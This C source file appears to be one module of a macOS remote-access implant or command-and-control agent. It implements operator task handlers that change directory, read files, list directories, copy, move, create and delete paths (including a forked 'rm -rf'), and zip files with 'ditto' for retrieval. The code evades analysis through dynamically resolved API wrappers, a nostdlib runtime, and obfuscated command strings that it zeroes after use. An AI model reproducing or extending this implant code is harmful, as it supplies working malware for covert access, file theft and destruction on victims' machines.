#include "tasks_fs.h"
#include "crt.h"
#include "dyld_resolve.h"
#include "strings_obf.h"

#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <dirent.h>
#include <pwd.h>
#include <grp.h>
#include <time.h>
#include <copyfile.h>

// Helper: expand ~ to home directory
static void normalize_path(const char* input, char* out, size_t out_size) {
    if (input[0] == '~' && (input[1] == '/' || input[1] == '\0')) {
        const char* home = R_getenv("HOME");
        if (!home) {
            struct passwd* pw = (struct passwd*)R_getpwuid(R_getuid());
            home = pw ? pw->pw_dir : "/tmp";
        }
        ax_strncpy(out, home, out_size - 1);
        ax_strcat(out, input + 1);
    } else {
        ax_strncpy(out, input, out_size - 1);
    }
    out[out_size - 1] = '\0';
}

// Helper: parse a single string field from msgpack params
static int parse_string_param(const uint8_t* data, uint32_t data_len,
                               const char* key_name, char* out, size_t out_size) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) return -1;

    for (uint32_t i = 0; i < map_count; i++) {
        const char* key; uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) return -1;
        if (klen == ax_strlen(key_name) && ax_memcmp(key, key_name, klen) == 0) {
            const char* val; uint32_t vlen;
            if (mp_read_str(&r, &val, &vlen) != 0) return -1;
            if (vlen >= out_size) vlen = (uint32_t)(out_size - 1);
            ax_memcpy(out, val, vlen);
            out[vlen] = '\0';
            return 0;
        }
        mp_skip(&r);
    }
    return -1;
}

// Helper: parse two string fields (src, dst)
static int parse_two_strings(const uint8_t* data, uint32_t data_len,
                              const char* key1, char* out1, size_t out1_size,
                              const char* key2, char* out2, size_t out2_size) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) return -1;

    int found = 0;
    for (uint32_t i = 0; i < map_count; i++) {
        const char* key; uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) return -1;
        if (klen == ax_strlen(key1) && ax_memcmp(key, key1, klen) == 0) {
            const char* val; uint32_t vlen;
            if (mp_read_str(&r, &val, &vlen) != 0) return -1;
            if (vlen >= out1_size) vlen = (uint32_t)(out1_size - 1);
            ax_memcpy(out1, val, vlen);
            out1[vlen] = '\0';
            found++;
        } else if (klen == ax_strlen(key2) && ax_memcmp(key, key2, klen) == 0) {
            const char* val; uint32_t vlen;
            if (mp_read_str(&r, &val, &vlen) != 0) return -1;
            if (vlen >= out2_size) vlen = (uint32_t)(out2_size - 1);
            ax_memcpy(out2, val, vlen);
            out2[vlen] = '\0';
            found++;
        } else {
            mp_skip(&r);
        }
    }
    return (found >= 2) ? 0 : -1;
}

static void write_error(mp_writer_t* w, const char* msg) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "error", msg);
}

// ---- Command handlers ----

int task_cd(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    char raw_path[4096] = {0};
    if (parse_string_param(data, data_len, "path", raw_path, sizeof(raw_path)) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    char path[4096];
    normalize_path(raw_path, path, sizeof(path));

    if (R_chdir(path) != 0) {
        write_error(w, "chdir failed");
        return 0;
    }

    char cwd[4096];
    if (R_getcwd(cwd, sizeof(cwd)) == NULL) {
        write_error(w, "getcwd failed");
        return 0;
    }

    // Response: AnsPwd {path: string}
    mp_write_map(w, 1);
    mp_write_kv_str(w, "path", cwd);
    return 0;
}

int task_cat(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    char raw_path[4096] = {0};
    if (parse_string_param(data, data_len, "path", raw_path, sizeof(raw_path)) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    char path[4096];
    normalize_path(raw_path, path, sizeof(path));

    // Check file size (max 1 MB)
    struct stat st;
    if (R_stat(path, &st) != 0) {
        write_error(w, "file not found");
        return 0;
    }
    if (st.st_size > 1024 * 1024) {
        write_error(w, "file size exceeds 1 Mb (use download)");
        return 0;
    }

    int fd = R_open(path, O_RDONLY, 0);
    if (fd < 0) {
        write_error(w, "cannot open file");
        return 0;
    }

    uint8_t* content = (uint8_t*)ax_malloc((size_t)st.st_size);
    ssize_t n = R_read(fd, content, (size_t)st.st_size);
    R_close(fd);

    if (n < 0) {
        ax_free(content, (size_t)st.st_size);
        write_error(w, "read failed");
        return 0;
    }

    // Response: AnsCat {path, content}
    mp_write_map(w, 2);
    mp_write_kv_str(w, "path", path);
    mp_write_kv_bin(w, "content", content, (uint32_t)n);

    ax_free(content, (size_t)st.st_size);
    return 0;
}

int task_ls(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    char raw_path[4096] = {0};
    // Default to "." if no path
    ax_strcpy(raw_path, ".");
    parse_string_param(data, data_len, "path", raw_path, sizeof(raw_path));

    char path[4096];
    normalize_path(raw_path, path, sizeof(path));

    // Check if single file
    struct stat st;
    if (R_stat(path, &st) != 0) {
        mp_write_map(w, 3);
        mp_write_kv_bool(w, "result", 0);
        mp_write_kv_str(w, "status", "path not found");
        mp_write_kv_str(w, "path", path);
        return 0;
    }

    // Build file list
    mp_writer_t files_writer;
    mp_writer_init(&files_writer, 4096);

    if (S_ISDIR(st.st_mode)) {
        DIR* dir = (DIR*)R_opendir(path);
        if (!dir) {
            mp_write_map(w, 3);
            mp_write_kv_bool(w, "result", 0);
            mp_write_kv_str(w, "status", "cannot open directory");
            mp_write_kv_str(w, "path", path);
            return 0;
        }

        // Count entries first
        uint32_t count = 0;
        struct dirent* ent;
        while ((ent = (struct dirent*)R_readdir(dir)) != NULL) count++;
        R_rewinddir(dir);

        mp_write_array(&files_writer, count);
        while ((ent = (struct dirent*)R_readdir(dir)) != NULL) {
            char fullpath[4096];
            ax_strncpy(fullpath, path, sizeof(fullpath) - 1);
            size_t plen = ax_strlen(fullpath);
            if (plen > 0 && fullpath[plen - 1] != '/') {
                ax_strcat(fullpath, "/");
            }
            ax_strcat(fullpath, ent->d_name);

            struct stat fst;
            if (R_stat(fullpath, &fst) != 0) {
                ax_memset(&fst, 0, sizeof(fst));
            }

            // Mode string
            char mode[11];
            mode[0] = S_ISDIR(fst.st_mode) ? 'd' : (S_ISLNK(fst.st_mode) ? 'l' : '-');
            mode[1] = (fst.st_mode & S_IRUSR) ? 'r' : '-';
            mode[2] = (fst.st_mode & S_IWUSR) ? 'w' : '-';
            mode[3] = (fst.st_mode & S_IXUSR) ? 'x' : '-';
            mode[4] = (fst.st_mode & S_IRGRP) ? 'r' : '-';
            mode[5] = (fst.st_mode & S_IWGRP) ? 'w' : '-';
            mode[6] = (fst.st_mode & S_IXGRP) ? 'x' : '-';
            mode[7] = (fst.st_mode & S_IROTH) ? 'r' : '-';
            mode[8] = (fst.st_mode & S_IWOTH) ? 'w' : '-';
            mode[9] = (fst.st_mode & S_IXOTH) ? 'x' : '-';
            mode[10] = '\0';

            // User/Group
            struct passwd* pw = (struct passwd*)R_getpwuid(fst.st_uid);
            struct group* gr = (struct group*)R_getgrgid(fst.st_gid);
            const char* user = pw ? pw->pw_name : "?";
            const char* group = gr ? gr->gr_name : "?";

            // Date
            char date[64];
            struct tm* tm = (struct tm*)R_localtime(&fst.st_mtime);
            R_strftime(date, sizeof(date), "%b %d %H:%M", tm);

            // FileInfo map (declaration order)
            mp_write_map(&files_writer, 8);
            mp_write_kv_str(&files_writer, "mode", mode);
            mp_write_kv_int(&files_writer, "nlink", (int64_t)fst.st_nlink);
            mp_write_kv_str(&files_writer, "user", user);
            mp_write_kv_str(&files_writer, "group", group);
            mp_write_kv_int(&files_writer, "size", (int64_t)fst.st_size);
            mp_write_kv_str(&files_writer, "date", date);
            mp_write_kv_str(&files_writer, "filename", ent->d_name);
            mp_write_kv_bool(&files_writer, "is_dir", S_ISDIR(fst.st_mode) ? 1 : 0);
        }
        R_closedir(dir);
    } else {
        // Single file
        mp_write_array(&files_writer, 1);

        char mode[11];
        mode[0] = '-';
        mode[1] = (st.st_mode & S_IRUSR) ? 'r' : '-';
        mode[2] = (st.st_mode & S_IWUSR) ? 'w' : '-';
        mode[3] = (st.st_mode & S_IXUSR) ? 'x' : '-';
        mode[4] = (st.st_mode & S_IRGRP) ? 'r' : '-';
        mode[5] = (st.st_mode & S_IWGRP) ? 'w' : '-';
        mode[6] = (st.st_mode & S_IXGRP) ? 'x' : '-';
        mode[7] = (st.st_mode & S_IROTH) ? 'r' : '-';
        mode[8] = (st.st_mode & S_IWOTH) ? 'w' : '-';
        mode[9] = (st.st_mode & S_IXOTH) ? 'x' : '-';
        mode[10] = '\0';

        struct passwd* pw = (struct passwd*)R_getpwuid(st.st_uid);
        struct group* gr = (struct group*)R_getgrgid(st.st_gid);
        const char* user = pw ? pw->pw_name : "?";
        const char* group = gr ? gr->gr_name : "?";

        char date[64];
        struct tm* tm = (struct tm*)R_localtime(&st.st_mtime);
        R_strftime(date, sizeof(date), "%b %d %H:%M", tm);

        // Extract basename
        const char* basename = raw_path;
        for (const char* p = raw_path; *p; p++) {
            if (*p == '/') basename = p + 1;
        }

        mp_write_map(&files_writer, 8);
        mp_write_kv_str(&files_writer, "mode", mode);
        mp_write_kv_int(&files_writer, "nlink", (int64_t)st.st_nlink);
        mp_write_kv_str(&files_writer, "user", user);
        mp_write_kv_str(&files_writer, "group", group);
        mp_write_kv_int(&files_writer, "size", (int64_t)st.st_size);
        mp_write_kv_str(&files_writer, "date", date);
        mp_write_kv_str(&files_writer, "filename", basename);
        mp_write_kv_bool(&files_writer, "is_dir", 0);
    }

    // Ensure path ends with /
    char display_path[4096];
    ax_strncpy(display_path, path, sizeof(display_path) - 2);
    size_t dlen = ax_strlen(display_path);
    if (dlen > 0 && display_path[dlen - 1] != '/' && S_ISDIR(st.st_mode)) {
        display_path[dlen] = '/';
        display_path[dlen + 1] = '\0';
    }

    // Response: AnsLs {result, status, path, files}
    mp_write_map(w, 4);
    mp_write_kv_bool(w, "result", 1);
    mp_write_kv_str(w, "status", "");
    mp_write_kv_str(w, "path", display_path);
    mp_write_kv_bin(w, "files", files_writer.buf.data, (uint32_t)files_writer.buf.len);

    mp_writer_free(&files_writer);
    return 0;
}

int task_cp(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    char raw_src[4096] = {0}, raw_dst[4096] = {0};
    if (parse_two_strings(data, data_len, "src", raw_src, sizeof(raw_src),
                           "dst", raw_dst, sizeof(raw_dst)) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    char src[4096], dst[4096];
    normalize_path(raw_src, src, sizeof(src));
    normalize_path(raw_dst, dst, sizeof(dst));

    // Use macOS copyfile() for both files and directories
    copyfile_flags_t flags = COPYFILE_ALL | COPYFILE_RECURSIVE;
    if (R_copyfile(src, dst, NULL, flags) != 0) {
        write_error(w, "copy failed");
        return 0;
    }

    // No response body on success (nil equivalent)
    mp_write_nil(w);
    return 0;
}

int task_mv(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    char raw_src[4096] = {0}, raw_dst[4096] = {0};
    if (parse_two_strings(data, data_len, "src", raw_src, sizeof(raw_src),
                           "dst", raw_dst, sizeof(raw_dst)) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    char src[4096], dst[4096];
    normalize_path(raw_src, src, sizeof(src));
    normalize_path(raw_dst, dst, sizeof(dst));

    // Try rename first (same filesystem)
    if (R_rename(src, dst) != 0) {
        // Fallback: copy + delete
        copyfile_flags_t flags = COPYFILE_ALL | COPYFILE_RECURSIVE;
        if (R_copyfile(src, dst, NULL, flags) != 0) {
            write_error(w, "move failed");
            return 0;
        }
        // Delete source
        struct stat st;
        if (R_stat(src, &st) == 0) {
            if (S_ISDIR(st.st_mode)) {
                // Recursive delete — use a simple shell approach
                // since we don't have nftw in nostdlib
                // For now, just rmdir (works for empty dirs)
                R_rmdir(src);
            } else {
                R_unlink(src);
            }
        }
    }

    mp_write_nil(w);
    return 0;
}

int task_mkdir(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    char raw_path[4096] = {0};
    if (parse_string_param(data, data_len, "path", raw_path, sizeof(raw_path)) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    char path[4096];
    normalize_path(raw_path, path, sizeof(path));

    // Create directory with parents (simplified mkdirall)
    char tmp[4096];
    ax_strncpy(tmp, path, sizeof(tmp) - 1);
    for (char* p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            R_mkdir(tmp, 0755);
            *p = '/';
        }
    }
    if (R_mkdir(tmp, 0755) != 0) {
        struct stat st;
        if (R_stat(tmp, &st) != 0 || !S_ISDIR(st.st_mode)) {
            write_error(w, "mkdir failed");
            return 0;
        }
    }

    mp_write_nil(w);
    return 0;
}

int task_rm(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    char raw_path[4096] = {0};
    if (parse_string_param(data, data_len, "path", raw_path, sizeof(raw_path)) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    char path[4096];
    normalize_path(raw_path, path, sizeof(path));

    struct stat st;
    if (R_stat(path, &st) != 0) {
        write_error(w, "path not found");
        return 0;
    }

    if (S_ISDIR(st.st_mode)) {
        // Recursive directory removal via fork+exec
        DEOBF(rm_path, OBF_RM);
        pid_t pid = R_fork();
        if (pid == 0) {
            R_execl(rm_path, "rm", "-rf", path, NULL);
            R_exit(1);
        } else if (pid > 0) {
            int status;
            R_waitpid(pid, &status, 0);
            ZERO_STR(rm_path, OBF_RM);
            if (WEXITSTATUS(status) != 0) {
                write_error(w, "rm -rf failed");
                return 0;
            }
        } else {
            write_error(w, "fork failed");
            return 0;
        }
    } else {
        if (R_unlink(path) != 0) {
            write_error(w, "unlink failed");
            return 0;
        }
    }

    mp_write_nil(w);
    return 0;
}

int task_zip(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    char raw_src[4096] = {0}, raw_dst[4096] = {0};
    if (parse_two_strings(data, data_len, "src", raw_src, sizeof(raw_src),
                           "dst", raw_dst, sizeof(raw_dst)) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    char src[4096], dst[4096];
    normalize_path(raw_src, src, sizeof(src));
    normalize_path(raw_dst, dst, sizeof(dst));

    // Use ditto (macOS built-in) to create zip
    DEOBF(ditto_path, OBF_DITTO);
    pid_t pid = R_fork();
    if (pid == 0) {
        R_execl(ditto_path, "ditto", "-c", "-k", "--sequesterRsrc", src, dst, NULL);
        R_exit(1);
    } else if (pid > 0) {
        int status;
        R_waitpid(pid, &status, 0);
        ZERO_STR(ditto_path, OBF_DITTO);
        if (WEXITSTATUS(status) != 0) {
            write_error(w, "zip failed");
            return 0;
        }
    } else {
        write_error(w, "fork failed");
        return 0;
    }

    // Response: AnsZip {path}
    mp_write_map(w, 1);
    mp_write_kv_str(w, "path", dst);
    return 0;
}
